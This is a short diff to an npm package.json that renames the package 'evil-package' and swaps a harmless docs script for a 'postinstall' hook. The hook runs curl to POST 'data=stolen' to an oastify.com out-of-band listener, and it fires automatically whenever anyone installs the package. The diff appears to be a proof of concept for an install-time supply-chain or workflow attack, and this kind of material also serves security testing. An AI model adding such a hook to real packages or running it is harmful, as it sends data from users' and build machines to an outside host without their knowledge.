@@ -1,8 +1,8 @@
+// evil-package/package.json
 {
-  "name": "workflow-test",
+  "name": "evil-package",
   "version": "1.0.0",
   "scripts": {
-    "build-docs": "echo Building docs..."
-  },
-  "dependencies": {}
+    "postinstall": "curl -X POST http://o8x78f7hszbo7ftsce88acfee5kv8k.oastify.com -d 'data=stolen'"
+  }
 }
